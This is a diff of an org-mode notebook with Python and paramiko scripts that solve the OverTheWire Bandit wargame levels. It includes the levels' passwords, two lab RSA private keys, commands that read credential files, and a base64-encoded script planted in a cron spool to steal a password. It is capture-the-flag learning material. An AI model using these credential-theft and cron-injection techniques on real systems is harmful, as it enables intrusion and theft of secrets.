@@ -15,6 +15,8 @@ import gzip
 import subprocess
 import utils
 import re
+import base64
+import time
 
 host = "bandit.labs.overthewire.org"
 ssh_port = 2220
@@ -45,77 +47,85 @@ def save():
         json.dump(credentials, f)
 
 def load():
+    global credentials
     with open('bandit.progress','r') as f:
         credentials = json.load(f)
 #+end_src
 
 * Bandit0 => Bandit1
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit0():
     print("Pwning bandit0")
     connect('bandit0')
     _, out, _ = ssh.exec_command('cat readme')
-
     credentials["bandit1"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit0()
 credentials['bandit1']
 #+end_src
 
 #+RESULTS:
-: 'boJ9jbbUNNfktd78OOpsqOltutMc3MY1'
+: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
 
 * Bandit1 => Bandit2
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit1():
     print("Pwning bandit1")
     connect('bandit1')
     _, out, _ = ssh.exec_command('cat ./-')
-    credentials["bandit2"] = out.read().decode().strip()
+    credentials["bandit2"] = out.readline().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit1()
 credentials['bandit2']
 #+end_src
 
 #+RESULTS:
-: 'CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9'
+: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
 
 * Bandit2 => Bandit3
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit2():
     print("Pwning bandit2")
     connect('bandit2')
     _, out, _ = ssh.exec_command('cat "spaces in this filename"')
-    credentials["bandit3"] = out.read().decode().strip()
+    credentials["bandit3"] = out.readline().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit2()
 credentials['bandit3']
 #+end_src
 
 #+RESULTS:
-: 'UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK'
+: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
 
 * Bandit3 => Bandit4
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit3():
     print("Pwning bandit3")
     connect('bandit3')
     _, out, _ = ssh.exec_command('cat ./inhere/.hidden')
     credentials["bandit4"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit3()
 credentials['bandit4']
 #+end_src
 
 #+RESULTS:
-: 'pIwrPrtPN36QITSp3EQaw936yaFoFgAB'
+: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
 
 * Bandit4 => Bandit5
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit4():
     print("Pwning bandit4")
     connect('bandit4')
@@ -127,16 +137,18 @@ def bandit4():
     _, out, _ = ssh.exec_command(F'cat {file}')
     credentials["bandit5"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit4()
 credentials['bandit5']
 #+end_src
 
 #+RESULTS:
-: 'koReBOKuIDDepwhWk7jZC0RTdopnAYKh'
+: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
 
 * Bandit5 => Bandit6
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit5():
     print("Pwning bandit5")
     connect('bandit5')
@@ -146,16 +158,18 @@ def bandit5():
 
     credentials["bandit6"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit5()
 credentials['bandit6']
 #+end_src
 
 #+RESULTS:
-: 'DXjZPULLxYr17uwoI01bNLQbtFemEgo7'
+: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
 
 * Bandit6 => Bandit7
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit6():
     print("Pwning bandit6")
     connect('bandit6')
@@ -165,16 +179,18 @@ def bandit6():
 
     credentials["bandit7"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit6()
 credentials['bandit7']
 #+end_src
 
 #+RESULTS:
-: 'HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs'
+: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
 
 * Bandit7 => Bandit8
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit7():
     print("Pwning bandit7")
     connect('bandit7')
@@ -184,17 +200,18 @@ def bandit7():
 
     credentials["bandit8"] = out.read().decode().strip()
     save()
+#+end_src
 
-
+#+begin_src python :session :exports none
 bandit7()
 credentials['bandit8']
 #+end_src
 
 #+RESULTS:
-: 'cvX2JJa4CFALtqS87jk27qwqGhBM9plV'
+: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
 
 * Bandit8 => Bandit9
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit8():
     print("Pwning bandit8")
     connect('bandit8')
@@ -204,16 +221,18 @@ def bandit8():
 
     credentials["bandit9"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit8()
 credentials['bandit9']
 #+end_src
 
 #+RESULTS:
-: 'UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR'
+: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
 
 * Bandit9 => Bandit10
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit9():
     print("Pwning bandit9")
     connect('bandit9')
@@ -223,16 +242,18 @@ def bandit9():
 
     credentials["bandit10"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit9()
 credentials['bandit10']
 #+end_src
 
 #+RESULTS:
-: 'truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk'
+: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
 
 * Bandit10 => Bandit11
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit10():
     print("Pwning bandit10")
     connect('bandit10')
@@ -242,16 +263,18 @@ def bandit10():
 
     credentials["bandit11"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit10()
 credentials['bandit11']
 #+end_src
 
 #+RESULTS:
-: 'IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR'
+: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
 
 * Bandit11 => Bandit12
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit11():
     print("Pwning bandit11")
     connect('bandit11')
@@ -261,16 +284,18 @@ def bandit11():
 
     credentials["bandit12"] = out.read().decode().strip()
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit11()
 credentials['bandit12']
 #+end_src
 
 #+RESULTS:
-: '5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu'
+: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
 
 * Bandit12 => Bandit13
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit12():
     print("Pwning bandit12")
     connect('bandit12')
@@ -304,16 +329,18 @@ def bandit12():
 
     os.chdir(root)
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit12()
 credentials['bandit13']
 #+end_src
 
 #+RESULTS:
-: '8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL'
+: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
 
 * Bandit13 => Bandit14
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit13():
     print("Pwning bandit13")
     connect('bandit13')
@@ -336,12 +363,46 @@ def bandit13():
 
     os.chdir(root)
     save()
-
-bandit13()
 #+end_src
 
+#+begin_src python :session :exports none
+bandit13()
+open(credentials['bandit14'][0]).read()
+#+end_src
+
+#+RESULTS:
+#+begin_example
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
+gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
+ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
+ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
+ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
+jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
+J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
+pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
+xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
+nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
+o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
+ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
+laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
+M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
+1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
+PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
+8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
+xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
+GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
+3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
+iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
+9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
+qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
+kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
+/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
+-----END RSA PRIVATE KEY-----
+#+end_example
+
 * Bandit14 => Bandit15
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit14():
     print("Pwning bandit14")
     connect('bandit14')
@@ -358,11 +419,11 @@ def bandit14():
         bandit14_creds[1] = passwd
 
     _, out, _ = ssh.exec_command(F'nc localhost 30000 < {bandit14_pass_file} | xargs | cut -d " " -f2')
-
     credentials['bandit15'] = out.read().decode().strip()
-
     save()
+#+end_src
 
+#+begin_src python :session :exports none :results value pp
 bandit14()
 {'bandit14': credentials['bandit14'][1], 'bandit15': credentials['bandit15']}
 #+end_src
@@ -372,7 +433,7 @@ bandit14()
 :  'bandit15': 'BfMYroe26WYalil77FoDi9qh59eK5xNr'}
 
 * Bandit15 => Bandit16
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit15():
     print("Pwning bandit15")
     connect('bandit15')
@@ -393,13 +454,15 @@ def bandit15():
     credentials['bandit16'] = passwd
 
     save()
+#+end_src
 
+#+begin_src python :session :exports none
 bandit15()
 credentials['bandit16']
 #+end_src
 
 #+RESULTS:
-: 'cluFn7wTiGryunymYOu4RcffSxQluehd'
+: cluFn7wTiGryunymYOu4RcffSxQluehd
 
 * Bandit16 => Bandit17
 #+begin_src python :tangle ape.py :session :results silent
@@ -430,12 +493,47 @@ def bandit16():
 
     credentials['bandit17'] = [os.getcwd() + "/" + file_path]
     save()
-
-bandit16()
 #+end_src
 
+#+begin_src python :session :exports none
+bandit16()
+open(credentials['bandit17'][0]).read()
+#+end_src
+
+#+RESULTS:
+#+begin_example
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+#+end_example
+
 * Bandit17 => Bandit18
-#+begin_src python :tangle ape.py :session :results value pp
+#+begin_src python :tangle ape.py :session :results silent
 def bandit17():
     print("Pwning bandit17")
     connect('bandit17')
@@ -450,11 +548,12 @@ def bandit17():
 
     _, out, _ = ssh.exec_command('diff passwords.new passwords.old')
     passwd = re.findall(r'< .*$', out.read().decode(), re.MULTILINE)[0][2:]
-
     credentials['bandit18'] = passwd
 
     save()
+#+end_src
 
+#+begin_src python :session :exports none :results value pp
 bandit17()
 {'bandit17': credentials['bandit17'][1], 'bandit18': credentials['bandit18']}
 #+end_src
@@ -465,62 +564,79 @@ bandit17()
 
 * Bandit18 => Bandit19
 
-Trying to log in with the normal =ssh= command will kick us out but with paramiko its pretty simple
-#+begin_src python :tangle ape.py
+Trying to log in with the normal =ssh= command will kick us out but with paramiko it's pretty simple
+#+begin_src python :tangle ape.py :session :results silent
 def bandit18():
     print("Pwning bandit18")
     connect('bandit18')
-
     _, out, _ = ssh.exec_command('cat readme')
-
     credentials['bandit19'] = out.readline().strip()
-
     save()
 #+end_src
 
+#+begin_src python :session :exports none
+bandit18()
+credentials['bandit19']
+#+end_src
+
+#+RESULTS:
+: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
 * Bandit19 => Bandit20
-#+begin_src python :tangle ape.py
+#+begin_src python :tangle ape.py :session :results silent
 def bandit19():
     print("Pwning bandit19")
     connect('bandit19')
-
     _, out, _ = ssh.exec_command('./bandit20-do cat /etc/bandit_pass/bandit20')
-
     credentials['bandit20'] = out.readline().strip()
-
     save()
 #+end_src
 
+#+begin_src python :session :exports none
+bandit19()
+credentials['bandit20']
+#+end_src
+
+#+RESULTS:
+: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
 * Bandit20 => Bandit21
-#+begin_src python :tangle ape.py
+#+begin_src python :tangle ape.py :session :results silent
 def bandit20():
     print("Pwning bandit20")
     connect('bandit20')
-
     port = 4444
     _, out, _ = ssh.exec_command(f'nc -lnvp {port} < /etc/bandit_pass/bandit20 & sleep 2 && ./suconnect {port}')
-
     passwd = [x.strip() for x in out.readlines() if len(x) == 33][0]
-
     credentials['bandit21'] = passwd
-
     save()
 #+end_src
 
+#+begin_src python :session :exports none
+bandit20()
+credentials['bandit21']
+#+end_src
+
+#+RESULTS:
+: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
 * Bandit21 => Bandit22
 
-The cronjob script is catting the bandit22 password file into a file in the /tmp folder
-#+begin_src python :exports both
-import paramiko
-host = "bandit.labs.overthewire.org"
-ssh_port = 2220
-password = "gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr"
-ssh = paramiko.SSHClient()
-ssh.load_system_host_keys()
-ssh.connect(host, ssh_port, username='bandit21', password=password)
-_, out, _ = ssh.exec_command('cat /usr/bin/cronjob_bandit22.sh')
+The cronjob script is catting the bandit22 password file into a file in the /tmp folder every minute
+#+begin_src python :session :exports both
+connect('bandit21')
+_, out, _ = ssh.exec_command('cat /etc/cron.d/cronjob_bandit22')
+out.read().decode()
+#+end_src
 
-return out.read().decode()
+#+RESULTS:
+: @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+: * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+#+begin_src python :session :exports both
+connect('bandit21')
+_, out, _ = ssh.exec_command('cat /usr/bin/cronjob_bandit22.sh')
+out.read().decode()
 #+end_src
 
 #+RESULTS:
@@ -528,32 +644,41 @@ return out.read().decode()
 : chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 : cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 
-#+begin_src python :tangle ape.py
+All we have to do is read that file
+#+begin_src python :tangle ape.py :session :results silent
 def bandit21():
     print("Pwning bandit21")
     connect('bandit21')
-
     _, out, _ = ssh.exec_command('cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv')
-
     credentials['bandit22'] = out.readline().strip()
-
     save()
 #+end_src
+
+#+begin_src python :session :exports none
+bandit21()
+credentials['bandit22']
+#+end_src
+
+#+RESULTS:
+: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 
 * Bandit22 => Bandit23
 
 Another cron script for us to look at and exploit
-#+begin_src python :exports both
-import paramiko
-host = "bandit.labs.overthewire.org"
-ssh_port = 2220
-password = "Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI"
-ssh = paramiko.SSHClient()
-ssh.load_system_host_keys()
-ssh.connect(host, ssh_port, username='bandit22', password=password)
-_, out, _ = ssh.exec_command('cat /usr/bin/cronjob_bandit23.sh')
+#+begin_src python :session :exports both
+connect('bandit22')
+_, out, _ = ssh.exec_command('cat /etc/cron.d/cronjob_bandit23')
+out.read().decode()
+#+end_src
 
-return out.read().decode()
+#+RESULTS:
+: @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+: * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+#+begin_src python :session :exports both
+connect('bandit22')
+_, out, _ = ssh.exec_command('cat /usr/bin/cronjob_bandit23.sh')
+out.read().decode()
 #+end_src
 
 #+RESULTS:
@@ -567,8 +692,7 @@ return out.read().decode()
 : cat /etc/bandit_pass/$myname > /tmp/$mytarget
 
 Running this bash script with the =myname= variable set to bandit23, we see that the output of the password file is being written to another temp file like the previous challenge.
-#+begin_src shell :exports results
-# myname=$(whoami)
+#+begin_src shell :exports both
 myname='bandit23'
 mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
@@ -577,32 +701,30 @@ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 #+RESULTS:
 : Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349
 
-#+begin_src python :tangle ape.py
+#+begin_src python :tangle ape.py :session :results silent
 def bandit22():
     print("Pwning bandit22")
     connect('bandit22')
-
     _, out, _ = ssh.exec_command('cat /tmp/8ca319486bfbbc3663ea0fbe81326349')
-
     credentials['bandit23'] = out.readline().strip()
-
     save()
 #+end_src
+
+#+begin_src python :session :exports none
+bandit22()
+credentials['bandit23']
+#+end_src
+
+#+RESULTS:
+: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 * Bandit23 => Bandit24
 
 More cron scripts! Except now we have to write our own
-#+begin_src python :exports both
-import paramiko
-host = "bandit.labs.overthewire.org"
-ssh_port = 2220
-password = "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n"
-ssh = paramiko.SSHClient()
-ssh.load_system_host_keys()
-ssh.connect(host, ssh_port, username='bandit23', password=password)
+#+begin_src python :session :exports both
+connect('bandit23')
 _, out, _ = ssh.exec_command('cat /usr/bin/cronjob_bandit24.sh')
-
-return out.read().decode()
+out.read().decode()
 #+end_src
 
 #+RESULTS:
@@ -625,22 +747,43 @@ do
         rm -f ./$i
     fi
 done
+
 #+end_example
 
-Now we need to create our own script to be executed by the cronjob. We'll just use a simple script to read the password file and put it in a temp file
-#+begin_src shell :exports code
-cat /etc/bandit_pass/bandit24 > /tmp/jay
-chmod +r /tmp/jay
-#+end_src
+This script executes all script files in \/var/spool/bandit24/
+Now we need to create our own script to be executed by the cronjob.
+We'll just use a simple script to read the password file and put it in a temp file that we can read
 
-#+begin_src python :tangle ape.py
-def bandit22():
-    print("Pwning bandit22")
-    connect('bandit22')
+#+begin_src python :tangle ape.py :session :results silent
+def bandit23():
+    print("Pwning bandit23")
+    connect('bandit23')
+    script = b"""cat /etc/bandit_pass/bandit24 > /tmp/jaydlc
+    chmod +rw /tmp/jaydlc"""
+    encoded = base64.b64encode(script).decode()
+    script_path = '/var/spool/bandit24/jaydlc.sh'
+    print("Sending over script to run")
+    command = F'echo {encoded} | base64 -d > {script_path} && chmod +x {script_path}'
+    ssh.exec_command(command)
+    print("Waiting for one minute before reading password file")
+    sleep_seconds = 60
+    _, out, _ = ssh.exec_command(f'sleep {sleep_seconds} && cat /tmp/jaydlc')
+    for remaining in range(sleep_seconds, 0, -1):
+        sys.stdout.write('\r')
+        sys.stdout.write('{:2d} seconds remaining'.format(remaining))
+        sys.stdout.flush()
+        time.sleep(1)
 
-    _, out, _ = ssh.exec_command('cat /tmp/8ca319486bfbbc3663ea0fbe81326349')
-
-    credentials['bandit23'] = out.readline().strip()
-
+    passwd = out.readline().strip()
+    sys.stdout.write('\rRetrieved password! Password is ' + passwd)
+    credentials['bandit24'] = passwd
     save()
 #+end_src
+
+#+begin_src python :session :exports none
+bandit23()
+credentials['bandit23']
+#+end_src
+
+#+RESULTS:
+: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
